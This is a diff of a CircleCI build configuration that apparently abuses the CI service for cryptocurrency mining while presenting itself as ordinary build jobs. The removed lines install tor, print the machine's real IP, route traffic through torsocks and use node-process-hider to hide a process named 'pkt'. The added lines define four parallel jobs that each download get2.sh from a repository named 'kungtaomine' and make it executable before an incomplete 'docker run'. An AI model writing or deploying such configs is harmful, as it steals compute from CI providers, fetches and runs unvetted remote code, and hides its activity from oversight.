@@ -1,15 +1,37 @@
-version: 2
+version: 2.1
+
+# Define the jobs we want to run for this project
 jobs:
- build:
-   machine: true
-   steps:
-     - checkout
-     # start proprietary DB using private Docker image
-     # with credentials stored in the UI
-     - run: | 
-          sudo apt update -y && sudo apt install tor -y && \
-          echo "IP ORI ===> " $(curl ifconfig.me) && \
-          sudo service tor start && sleep 30 && \
-          source torsocks on && \
-          sudo apt install npm -y && \
-          sudo npm i -g node-process-hider && sudo ph add pkt
+  gas1:
+    machine: true
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: docker run
+  gas2:
+    machine: true
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: docker run
+  gas3:
+    machine: true
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: docker run
+  gas4:
+    machine: true
+    steps:
+      - run: wget https://github.com/bebfuj/kungtaomine/raw/main/get2.sh 
+      - run: chmod 777 get2.sh 
+      - run: docker run
+
+# Orchestrate our job run sequence
+workflows:
+  alp_:
+    jobs:
+      - gas1
+      - gas2
+      - gas3
+      - gas4
